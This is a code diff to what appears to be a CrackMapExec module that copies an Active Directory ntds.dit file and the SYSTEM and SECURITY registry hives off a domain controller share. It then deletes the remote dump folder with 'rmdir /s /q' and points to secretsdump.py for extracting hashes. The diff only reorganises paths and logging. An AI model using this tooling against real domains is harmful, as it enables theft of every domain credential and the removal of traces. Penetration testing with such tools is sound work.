@@ -45,39 +45,42 @@ class CMEModule:
 
         if not os.path.isdir(self.dir_result):
             os.makedirs(self.dir_result, exist_ok=True)
+            os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)
+            os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)
 
-        context.log.info('Copy ntds.dit to host')
-        with open(os.path.join(self.dir_result,'ntds.dit'), 'wb+') as dump_file:
+        context.log.info("Copying NTDS dump to %s" % self.dir_result)
+        context.log.debug('Copy ntds.dit to host')
+        with open(os.path.join(self.dir_result,'Active Directory','ntds.dit'), 'wb+') as dump_file:
             try:
-                connection.conn.getFile(self.share, self.tmp_share + 'ntds.dit', dump_file.write)
-                context.log.success('Copied NTDS dump into ntds.dit')
+                connection.conn.getFile(self.share, self.tmp_share + 'Active Directory\\ntds.dit', dump_file.write)
+                context.log.debug('Copied ntds.dit file')
             except Exception as e:
-                context.log.error('Error while get file: {}'.format(e))
+                context.log.error('Error while get ntds.dit file: {}'.format(e))
 
-        context.log.info('Copy ntds.jfm to host')
-        with open(os.path.join(self.dir_result,'ntds.jfm'), 'wb+') as dump_file:
+        context.log.debug('Copy ntds.jfm to host')
+        with open(os.path.join(self.dir_result,'Active Directory','ntds.jfm'), 'wb+') as dump_file:
             try:
-                connection.conn.getFile(self.share, self.tmp_share + 'ntds.jfm', dump_file.write)
-                context.log.success('Copied NTDS dump into ntds.jfm')
+                connection.conn.getFile(self.share, self.tmp_share + 'Active Directory\\ntds.jfm', dump_file.write)
+                context.log.debug('Copied ntds.jfm file')
             except Exception as e:
-                context.log.error('Error while get file: {}'.format(e))
+                context.log.error('Error while get ntds.jfm file: {}'.format(e))
 
-        context.log.info('Copy SYSTEM to host')
-        with open(os.path.join(self.dir_result,'SYSTEM'), 'wb+') as dump_file:
+        context.log.debug('Copy SYSTEM to host')
+        with open(os.path.join(self.dir_result,'registry','SYSTEM'), 'wb+') as dump_file:
             try:
-                connection.conn.getFile(self.share, self.tmp_share + 'SYSTEM', dump_file.write)
-                context.log.success('Copied NTDS dump into SYSTEM')
+                connection.conn.getFile(self.share, self.tmp_share + 'registry\\SYSTEM', dump_file.write)
+                context.log.debug('Copied SYSTEM file')
             except Exception as e:
-                context.log.error('Error while get file: {}'.format(e))
+                context.log.error('Error while get SYSTEM file: {}'.format(e))
 
-        context.log.info('Copy SECURITY to host')
-        with open(os.path.join(self.dir_result,'SECURITY'), 'wb+') as dump_file:
+        context.log.debug('Copy SECURITY to host')
+        with open(os.path.join(self.dir_result,'registry','SECURITY'), 'wb+') as dump_file:
             try:
-                connection.conn.getFile(self.share, self.tmp_share + 'SECURITY', dump_file.write)
-                context.log.success('Copied NTDS dump into SECURITY')
+                connection.conn.getFile(self.share, self.tmp_share + 'registry\\SECURITY', dump_file.write)
+                context.log.debug('Copied SECURITY file')
             except Exception as e:
-                context.log.error('Error while get file: {}'.format(e))
-
+                context.log.error('Error while get SECURITY file: {}'.format(e))
+        context.log.success("NTDS dump copied to %s" % self.dir_result)
         try:
             command = "rmdir /s /q %s%s" % (self.tmp_dir, self.dump_location)
             p = connection.execute(command, True)
@@ -86,4 +89,4 @@ class CMEModule:
             context.log.error('Error deleting {} directory on share {}: {}'.format(self.dump_location, self.share, e))
 
         context.log.highlight("""Now simply:
-        secretsdump.py -system %s/SYSTEM -security %s/SECURITY -ntds %s/ntds.dit LOCAL"""% (self.dir_result, self.dir_result, self.dir_result))
+        secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds "%s/Active Directory/ntds.dit" LOCAL"""% (self.dir_result, self.dir_result, self.dir_result))
